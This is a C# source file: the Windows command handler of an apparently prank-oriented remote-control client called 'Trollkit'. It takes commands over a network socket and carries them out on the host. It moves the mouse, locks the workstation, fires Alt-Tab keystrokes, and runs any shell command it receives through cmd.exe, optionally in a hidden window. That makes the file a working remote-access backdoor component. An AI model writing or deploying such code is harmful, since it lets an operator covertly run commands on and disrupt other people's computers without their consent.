using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using System.Net.Sockets;

namespace Trollkit_Client.Modules.CommandHandlers
{
    public class WindowsHandler : ICommandHandler
    {
		[DllImport("user32.dll")]
		public static extern bool LockWorkStation();
		public bool HandleCommand(Socket s, TransferCommandObject obj)
        {
			switch (obj.Command)
			{
				case "MousePosition":
					MousePosition(obj.Value);
					return true;
				case "Command":
					RunCommand(obj.Value);
					return true;
				case "LockWindows":
					LockWorkStation();
					return true;
				case "AltTab":
					AltTab();
					return true;
			}

			return false;
		}

		private void MousePosition(string coordinates)
		{
			string[] values = coordinates.Split(',');
			Cursor.Position = new Point(int.Parse(values[0]), int.Parse(values[1]));
		}

		private void RunCommand(string command)
		{
			string[] values = command.Split(',');
			if (values[0] == "hidden")
			{
				Process process = new Process();
				ProcessStartInfo startInfo = new ProcessStartInfo();
				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.Arguments = $"/C {values[1]}";
				process.StartInfo = startInfo;
				process.Start();
			}
			else if (values[0] == "show")
			{
				Process.Start("CMD.exe", $"/C {values[1]} & pause");
			}
			else
			{
				Process.Start("CMD.exe", $"/C {command} & pause");
			}
		}

		private void AltTab()
		{
			Random number = new Random();
			Keyboard keyboard = new Keyboard();
			keyboard.Send(Keyboard.ScanCodeShort.MENU);
			keyboard.Send(Keyboard.ScanCodeShort.TAB);
			for (int i = 0; i < number.Next(2, 7); i++)
			{
				Thread.Sleep(10);
				keyboard.Send(Keyboard.ScanCodeShort.TAB);
			}
			keyboard.release(Keyboard.ScanCodeShort.MENU);
			keyboard.release(Keyboard.ScanCodeShort.TAB);
		}
    }
}
